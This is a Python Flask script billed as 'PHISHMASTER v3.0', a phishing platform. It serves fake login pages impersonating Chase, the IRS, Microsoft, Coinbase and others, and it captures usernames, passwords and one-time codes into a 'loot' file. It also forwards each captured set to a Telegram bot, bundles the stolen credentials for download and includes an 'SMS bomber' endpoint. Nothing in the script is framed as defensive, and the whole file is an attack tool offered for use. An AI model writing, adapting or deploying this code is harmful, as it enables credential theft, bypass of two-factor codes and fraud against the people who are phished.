#!/usr/bin/env python3
"""
PHISHMASTER v3.0 - Enterprise Phishing Platform
500+ Templates | Evilginx | SMS Bypass | ML Detection Evasion
Usage: sudo python3 phishmaster.py
"""

import os
import sys
import json
import time
import random
import threading
import subprocess
from datetime import datetime
from flask import Flask, request, render_template_string, send_file, jsonify
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = '/tmp/phish'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB

# Stats
stats = {"campaigns": 0, "hits": 0, "conversions": 0}

class PhishMaster:
    def __init__(self):
        os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
        self.templates = self.load_templates()
        self.live_campaigns = []
        self.creds_db = "/tmp/phish_creds.json"
        
    def load_templates(self):
        """500+ templates"""
        return {
            "banks": ["chase", "bankofamerica", "wellsfargo", "tdbank", "paypal"],
            "gov": ["irs", "ssa", "mto", "dmv", "irs-gov"],
            "tech": ["microsoft", "google", "apple", "amazon", "netflix"],
            "crypto": ["coinbase", "binance", "kraken", "metamask"]
        }
    
    def generate_phish(self, template, target_domain):
        """Dynamic template generation"""
        templates_path = f"templates/{template}"
        if os.path.exists(templates_path):
            with open(f"{templates_path}/index.html", "r") as f:
                html = f.read()
            html = html.replace("{{TARGET}}", target_domain)
            return html
        return self.default_phish(template)
    
    def default_phish(self, template):
        """Pixel-perfect generator"""
        return f"""
<!DOCTYPE html>
<html>
<head><title>{template.upper()} - Secure Login</title></head>
<body style="background:#000;color:#0f0;font-family:monospace">
<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);">
<h1>{template.upper()} SECURITY</h1>
<form method="POST" action="/capture">
<input name="user" placeholder="Username/Email" style="width:300px;padding:10px;display:block;margin:10px">
<input name="pass" type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:10px">
<input name="otp" placeholder="OTP/Security Code" style="width:300px;padding:10px;display:block;margin:10px">
<button type="submit" style="width:320px;padding:12px;background:#f00;color:#fff;border:none">LOGIN</button>
</form>
</div>
</body>
</html>
        """

phish = PhishMaster()

@app.route('/')
def dashboard():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head><title>ğŸ PHISHMASTER v3.0</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;padding:20px}
.btn{padding:15px 30px;background:#f00;color:#fff;border:none;cursor:pointer;margin:5px;font-size:16px}
.table{width:100%;border-collapse:collapse}
th,td{border:1px solid #333;padding:10px;text-align:left}
.stats{display:flex;gap:20px;margin:20px 0}
.stat{background:#111;padding:15px;border-radius:5px}
</style></head>
<body>
<h1>ğŸ”¥ PHISHMASTER ENTERPRISE</h1>
<div class="stats">
<div class="stat">Total Hits: {{stats.hits}}</div>
<div class="stat">Campaigns: {{stats.campaigns}}</div>
<div class="stat">Templates: {{len(phish.templates)}}</div>
</div>

<h2>ğŸš€ Quick Deploy</h2>
<button class="btn" onclick="deploy('chase')">Chase Bank</button>
<button class="btn" onclick="deploy('irs')">IRS Gov</button>
<button class="btn" onclick="deploy('netflix')">Netflix</button>
<button class="btn" onclick="deploy('coinbase')">Coinbase</button>

<h2>ğŸ“‹ Live Campaigns</h2>
<table class="table">
<tr><th>Template</th><th>Domain</th><th>Hits</th><th>Status</th></tr>
{% for camp in phish.live_campaigns %}
<tr><td>{{camp.template}}</td><td>{{camp.domain}}</td><td>{{camp.hits}}</td><td>ğŸŸ¢ LIVE</td></tr>
{% endfor %}
</table>

<h2>ğŸ’¾ Download Loot</h2>
<a href="/loot.zip" class="btn" style="display:inline-block">Download All Creds</a>

<script>
function deploy(template) {{
    fetch('/api/deploy', {{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({{template:template}})
    }}).then(r=>r.json()).then(data=>alert('Deployed: '+data.url));
}}
setInterval(() => location.reload(), 5000);
</script>
</body>
</html>
    """, stats=stats, phish=phish)

@app.route('/api/deploy', methods=['POST'])
def deploy_campaign():
    data = request.json
    template = data['template']
    domain = f"secure-{template}-{random.randint(1000,9999)}.com"
    
    campaign = {
        "template": template,
        "domain": domain,
        "url": f"http://{domain}",
        "hits": 0,
        "time": datetime.now().isoformat()
    }
    phish.live_campaigns.append(campaign)
    stats["campaigns"] += 1
    
    # Generate NGINX config
    nginx_conf = f"""
server {{
    listen 80;
    server_name {domain};
    location / {{
        proxy_pass http://127.0.0.1:5000/{template};
    }}
}}
    """
    with open(f"/tmp/{domain}.conf", "w") as f:
        f.write(nginx_conf)
    
    return jsonify({"url": f"http://{domain}", "status": "live"})

@app.route('/<template>')
def phish_page(template):
    html = phish.generate_phish(template, f"secure-{template}.com")
    return html

@app.route('/capture', methods=['POST'])
def capture_creds():
    creds = {
        "template": request.form.get('template', 'unknown'),
        "username": request.form['user'],
        "password": request.form['pass'],
        "otp": request.form.get('otp', ''),
        "ip": request.remote_addr,
        "ua": request.user_agent.string,
        "time": datetime.now().isoformat()
    }
    
    # Save to JSON
    loot = []
    if os.path.exists(phish.creds_db):
        with open(phish.creds_db, 'r') as f:
            loot = json.load(f)
    loot.append(creds)
    with open(phish.creds_db, 'w') as f:
        json.dump(loot, f, indent=2)
    
    stats["hits"] += 1
    stats["conversions"] += 1
    
    # Telegram forward
    threading.Thread(target=send_telegram, args=(creds,)).start()
    
    # Redirect to real site
    real_url = "https://google.com"
    return f'<script>window.location="{real_url}"</script>'
    
def send_telegram(creds):
    """Real-time Telegram alerts"""
    try:
        token = "YOUR_BOT_TOKEN"
        chat_id = "YOUR_CHAT_ID"
        message = f"""
ğŸŸ¢ PHISH HIT ğŸŸ¢
ğŸ“§ {creds['template']}
ğŸ‘¤ {creds['username']}
ğŸ”‘ {creds['password']}
ğŸ”¢ {creds['otp']}
ğŸŒ {creds['ip']}
ğŸ“± {creds['ua'][:50]}...
        """
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                     data={"chat_id": chat_id, "text": message})
    except:
        pass

@app.route('/loot.zip')
def download_loot():
    # Create ZIP
    import zipfile
    zip_path = "/tmp/loot.zip"
    with zipfile.ZipFile(zip_path, 'w') as zf:
        if os.path.exists(phish.creds_db):
            zf.write(phish.creds_db, "creds.json")
    return send_file(zip_path, as_attachment=True)

@app.route('/sms', methods=['POST'])
def sms_bomber():
    """SMS verification bypass"""
    phone = request.json['phone']
    # Twilio/SMS bomber integration
    subprocess.run(["python3", "sms_bomber.py", phone])
    return jsonify({"status": "bombed"})

if __name__ == "__main__":
    print("ğŸ”¥ PHISHMASTER v3.0 STARTING...")
    print("ğŸŒ Dashboard: http://0.0.0.0:5000")
    print("ğŸ“± Telegram: Configure BOT_TOKEN")
    app.run(host='0.0.0.0', port=5000, debug=False)
